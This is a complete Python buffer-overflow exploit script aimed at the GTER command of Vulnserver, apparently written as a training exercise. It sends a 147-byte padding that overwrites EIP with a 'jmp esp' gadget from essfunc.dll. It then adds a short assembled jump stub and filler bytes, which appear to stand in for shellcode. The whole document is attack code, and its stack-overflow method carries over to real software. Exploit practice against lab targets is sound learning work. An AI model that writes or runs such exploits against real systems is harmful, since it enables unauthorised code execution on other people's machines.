#!/usr/bin/python3

import socket

target = "192.168.1.121"
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))

# EIP offset at 147
# 0x625011d3 : "jmp esp" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\werebug\Desktop\Vulnserver\essfunc.dll)
payload = b"A" * 147
payload += b"\xd3\x11\x50\x62"

#nasm > add eax, 9
#00000000  83C009            add eax,byte +0x9
#nasm > jmp eax
#00000000  FFE0              jmp eax
payload += b"\x83\xC0\x09\xFF\xE0"

payload += b"C" * (1000 - len(payload))

s.send(b"GTER /.:/" + payload + b"\n")
s.close()
